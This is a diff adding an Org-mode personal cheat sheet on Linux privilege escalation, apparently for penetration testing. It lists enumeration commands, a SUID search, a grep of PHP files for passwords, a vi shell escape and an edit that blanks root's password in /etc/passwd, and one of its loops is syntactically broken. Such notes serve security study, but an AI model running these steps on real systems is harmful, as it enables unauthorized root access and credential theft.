@@ -1,0 +1,49 @@
+:PROPERTIES:
+:ID:       4affd395-5beb-4d38-ac31-f65962d627a8
+:END:
+#+title: Linux Priv Esc
+        #+created: [2025-02-27 Thu 08:49]
+        #+last_modified: [2025-02-27 Thu 08:49]
+* Intel gathering
+ - Kernel version
+   ~uname -r~
+   ~lsb_release -a~
+   ~cat /proc/version~
+ - Issuers
+   ~cat /etc/issue~
+ - Sudo
+   ~sudo -V~
+   ~sudo -l~
+ - History
+   ~history~
+   ~find /* -name .*history* -print 2>/dev/null~
+ - Cron Jobs
+   ~cat /etc/crontab~
+ - check id
+   ~id~
+ - Network info
+   ~ip a~
+ - User enumeration
+   ~for user in $(cat /etc/passwd) | cut -f1 -d":"; do id $user; done~
+   - Specifically root users
+   ~cat /etc/passwd | cut -f1,3,4 -d":" | grep "0:0" | cut -f1 -d":" | awk '{print $1}'~
+ - Root directory
+   ~ls -als /root~
+ - Web pages
+   ~touch /var/www/file~
+ - Software
+   ~dpkg -l~
+   ~rpm -qi *~ ??
+   ~yum list all~
+* LinEnum
+https://github.com/rebootuser/LinEnum
+* SUID
+find / -type f -perm -04000 -ls 2>/dev/null
+* Plain text
+find / -maxdepth 4 -name *.php -type f 2>/dev/null | xargs grep -C 3 -i pass
+* Vim
+If a user can run /usr/bin/vi as root then:
+!sh
+* /etc/passwd
+change root line:
+root::0:0:root:/root:/bin/bash
